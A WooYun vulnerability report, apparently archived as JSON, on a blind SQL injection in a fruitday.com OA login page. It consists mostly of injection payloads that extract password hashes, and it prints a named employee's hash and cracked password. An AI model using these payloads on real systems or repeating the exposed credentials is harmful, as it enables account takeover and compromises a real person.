{"id": 25196, "wybug_id": "wooyun-2015-0132431", "wybug_title": "天天果园某站存在SQL注入漏洞，可登陆任意人员账号", "wybug_corp": "fruitday.com", "wybug_author": "浮萍", "wybug_date": "2015-08-07 17:13", "wybug_open_date": "2015-09-21 20:50", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-07：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-21：\t细节向公众公开  简要描述：  详细说明：  http://hq.fruitday.com:89/login.do任意输入用户名时 提示用户未找到\n\n当用户名输入sysadmin时提示密码不正确\n\n输入sysadmin' and /**/len(loginid)>0 and 'a'='a同样提示密码不正确\n\nsysadmin' and /**/len(password)=32 and 'a'='a\n\n说明存在password字段 且长度为32然后开始获取password内容\nsysadmin' and (SUBSTRING(password,1,1)='s') and 'a'='asysadmin' and (SUBSTRING(password,1,1)='a') and 'a'='asysadmin' and (SUBSTRING(password,2,1)='a') and 'a'='asysadmin' and (SUBSTRING(password,3,1)='7') and 'a'='a....\n已知密码为md5加密这里只取9-24位\nsysadmin'%20and(substring(password,9,1)%3d'2')%20and%20'a'%3d'asysadmin'%20and(substring(password,10,1)%3d'c')%20and%20'a'%3d'asysadmin'%20and(substring(password,11,1)%3d'f')%20and%20'a'%3d'asysadmin'%20and(substring(password,12,1)%3d'c')%20and%20'a'%3d'asysadmin'%20and(substring(password,13,1)%3d'f')%20and%20'a'%3d'asysadmin'%20and(substring(password,14,1)%3d'9')%20and%20'a'%3d'asysadmin'%20and(substring(password,15,1)%3d'8')%20and%20'a'%3d'asysadmin'%20and(substring(password,16,1)%3d'4')%20and%20'a'%3d'asysadmin' and(substring(password,17,1)='d') and 'a'='asysadmin' and(substring(password,18,1)='3') and 'a'='asysadmin' and(substring(password,19,1)='9') and 'a'='asysadmin' and(substring(password,20,1)='0') and 'a'='asysadmin' and(substring(password,21,1)='a') and 'a'='asysadmin' and(substring(password,22,1)='a') and 'a'='asysadmin' and(substring(password,23,1)='2') and 'a'='asysadmin' and(substring(password,24,1)='b') and 'a'='a\nsysadmin的密码加密后密文为\n2cfcf984d390aa2b\n\nsysadmin' and(substring(password,9,16)='2cfcf984d390aa2b') and 'a'='a\n\n\n   漏洞证明：  根据 WooYun: 天天果园漏洞组合(OA+wifi+第三方渠道+RTX+企业QQ+SVN+宿舍网络) 可知该oa系统的登录名为姓名这里取一个人的名字作为用户名\n章继宗\nhttp://hq.fruitday.com:89/login.do?message=103&verify= 表示用户名未找到http://hq.fruitday.com:89/login.do?message=102&verify= 表示密码错误\n\n\n\n\n%E7%AB%A0%E7%BB%A7%E5%AE%97' and(substring(password,9,1)='a') and 'a'='a%E7%AB%A0%E7%BB%A7%E5%AE%97' and(substring(password,10,1)='0') and 'a'='a%E7%AB%A0%E7%BB%A7%E5%AE%97' and(substring(password,11,1)='b') and 'a'='a%E7%AB%A0%E7%BB%A7%E5%AE%97' and(substring(password,12,1)='9') and 'a'='a%E7%AB%A0%E7%BB%A7%E5%AE%97' and(substring(password,13,1)='2') and 'a'='a%E7%AB%A0%E7%BB%A7%E5%AE%97' and(substring(password,14,1)='3') and 'a'='a%E7%AB%A0%E7%BB%A7%E5%AE%97' and(substring(password,15,1)='8') and 'a'='a%E7%AB%A0%E7%BB%A7%E5%AE%97' and(substring(password,16,1)='2') and 'a'='a%E7%AB%A0%E7%BB%A7%E5%AE%97' and(substring(password,17,1)='0') and 'a'='a%E7%AB%A0%E7%BB%A7%E5%AE%97' and(substring(password,18,1)='d') and 'a'='a%E7%AB%A0%E7%BB%A7%E5%AE%97' and(substring(password,19,1)='c') and 'a'='a%E7%AB%A0%E7%BB%A7%E5%AE%97' and(substring(password,20,1)='c') and 'a'='a%E7%AB%A0%E7%BB%A7%E5%AE%97' and(substring(password,21,1)='5') and 'a'='a%E7%AB%A0%E7%BB%A7%E5%AE%97' and(substring(password,22,1)='0') and 'a'='a%E7%AB%A0%E7%BB%A7%E5%AE%97' and(substring(password,23,1)='9') and 'a'='a%E7%AB%A0%E7%BB%A7%E5%AE%97' and(substring(password,24,1)='a') and 'a'='a\n其密码对应的md5为a0b923820dcc509a经解密 密码是1登录提示\n\n   修复方案：     版权声明：转载请注明来源 浮萍@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-08-07 20:48 厂商回复： 非常感谢您提供的信息，我们会尽快查实修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}